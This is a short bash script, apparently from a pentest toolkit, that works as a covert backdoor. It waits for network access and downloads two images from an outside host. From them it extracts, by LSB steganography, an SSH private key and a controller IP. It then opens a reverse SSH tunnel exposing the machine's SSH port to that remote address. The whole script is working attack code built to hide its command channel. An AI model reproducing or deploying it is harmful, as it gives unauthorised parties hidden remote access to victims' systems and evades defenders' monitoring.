#! /bin/bash

#place IMAGE link with embedded key here:
IMG_key="https://24h.rip/tnrkebS7.jpg"
IMG_ip="https://24h.rip/tnrkemS7.jpg"

echo "I Started... " > /tmp/log
while :
do
	echo "Checking Network Status... " 
	if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
		echo "Its UP!"
		echo "IPv4 UP!" >> /tmp/log
		echo "grabbing Images..."
		if wget $IMG_key -O /tmp/image_key.png; then
			echo "Pulling key from image and placing in /tmp/key"
			/root/Pentest/LSB-Steganography/LSBSteg.txt.py decode -i /tmp/image_key.png -o /tmp/key
			chmod 600 /tmp/key
		else
			echo "Image grab failed..."
			echo "Key Image Download Failed" >> /tmp/log	
			exit 0
		fi
		if wget $IMG_ip -O /tmp/image_ip.png; then
			echo "Pulling IP from image and placing in /tmp/IP"
			/root/Pentest/LSB-Steganography/LSBSteg.txt.py decode -i /tmp/image_ip.png -o /tmp/IP
		else 
			echo "Image grab failed..."
			echo "IP image download failed" >> /tmp/log
			exit 0
		fi

		cat /tmp/IP | tr -d '\n' > /tmp/IPstrip
		#pull IP into variable
		fIP=$(cat /tmp/IP)
		
		
		echo "fIP variable Value:"
		echo $fIP
		
		echo "FILE CHECK:" 
		echo "/tmp/IP:"
		cat /tmp/IP

		echo "/tmp/key:"
		cat /tmp/key


		echo "Attempting SSH Connection.... check for port 2224 open on the target"

		ssh -i /tmp/key -N -R 2224:localhost:22 tunnel@$fIP &


		#MAIN BREAK FOR LOOP! 
		break
	else
		echo "Its DOWN!"
		echo "IPv4 DOWN!" > /tmp/log
	fi
	sleep 1

done
